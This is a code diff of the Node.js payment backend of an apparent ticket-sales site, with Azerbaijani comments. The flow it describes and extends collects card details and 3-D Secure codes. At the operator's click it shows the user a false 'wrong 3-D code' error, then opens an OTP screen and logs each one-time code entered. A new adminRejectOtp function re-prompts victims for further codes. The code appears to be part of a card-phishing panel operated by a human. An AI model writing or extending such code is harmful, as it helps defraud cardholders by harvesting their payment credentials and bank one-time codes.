@@ -5,10 +5,10 @@ const { anonIp } = require('../middleware/privacy');
 
 /* ==================== Ödəniş axını ====================
    1) İstifadəçi kart məlumatlarını + 3-D kodu yazır      -> stage: card_review (2 dəq geri sayım)
-   2) Admin 1-ci dəfə təsdiqləyir                          -> stage: wrong_code  (ekranda "səhv 3-D kod", kod təkrar göndərilir, yeni geri sayım)
-   3) Admin 2-ci dəfə təsdiqləyir                          -> stage: otp_entry   (istifadəçidə OTP ekranı açılır)
+   2) Admin 1-ci dəfə "Təsdiq Et" basdıqda                -> stage: wrong_code  (ekranda "səhv 3-D kod", kod təkrar göndərilir, yeni geri sayım)
+   3) Admin 2-ci dəfə "OTP Ekranını Aç" basdıqda          -> stage: otp_entry   (istifadəçidə OTP ekranı açılır)
    4) İstifadəçi OTP yazır                                 -> stage: otp_review  (yekun təsdiq gözlənilir)
-   5) Admin yekun təsdiq verir                             -> bilet verilir                             */
+   5) Admin 3-cü dəfə "Yekun Təsdiq" basdıqda              -> bilet verilir                             */
 
 const STAGE_SECONDS = 120; /* 2 dəqiqə */
 
@@ -126,15 +126,27 @@ async function submitVerificationCode(ref, code, meta) {
     payment = await Payment.findById(order.payment);
     if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
   }
-  if (payment.stage !== 'otp_entry') throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
+
+  /* OTP ekranında olmalı (otp_entry) */
+  if (payment.stage !== 'otp_entry') {
+    throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
+  }
 
   const entered = String(code || '').replace(/\D/g, '');
   if (entered.length < 4) throw Object.assign(new Error('Doğrulama kodu yanlışdır'), { status: 400 });
 
+  /* Kodu logla */
+  payment.codeAttempts.push({
+    code: entered,
+    kind: 'otp',
+    at: new Date(),
+    ip: (meta && meta.ip) || anonIp()
+  });
+
+  /* Admin tərəfindən təsdiqə göndər */
   payment.status = 'code_submitted';
   payment.codeSubmittedAt = new Date();
   payment.submittedCode = entered;
-  payment.codeAttempts.push({ code: entered, kind: 'otp', at: new Date(), ip: (meta && meta.ip) || anonIp() });
   startStage(payment, 'otp_review');
   await payment.save();
 
@@ -144,6 +156,31 @@ async function submitVerificationCode(ref, code, meta) {
   }
 
   return { payment, matched: entered === payment.verificationCode };
+}
+
+/* Admin OTP kodu səhvdir dedikdə - istifadəçi yenidən cəhd edə biləcək */
+async function adminRejectOtp(paymentId, adminEmail) {
+  const payment = await Payment.findById(paymentId);
+  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
+  if (payment.stage !== 'otp_review') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });
+
+  /* Yenidən OTP kodu göndər */
+  payment.verificationCode = h.randomDigits(6);
+  payment.status = 'awaiting_3ds';
+  payment.adminResentAt = new Date();
+  payment.adminFinalBy = adminEmail || 'admin';
+  startStage(payment, 'otp_entry');
+  await payment.save();
+
+  if (payment.order) {
+    const order = await Order.findById(payment.order);
+    if (order) {
+      order.status = 'awaiting_verification';
+      await order.save();
+    }
+  }
+
+  return { payment, code: payment.verificationCode };
 }
 
 /* Yekun admin təsdiqi: biletlər verilir və ödəniş tamamlanır */
@@ -265,6 +302,7 @@ module.exports = {
   initPayment,
   adminApproveCard,
   adminOpenOtp,
+  adminRejectOtp,
   submitVerificationCode,
   adminFinalApprove,
   adminDecline,
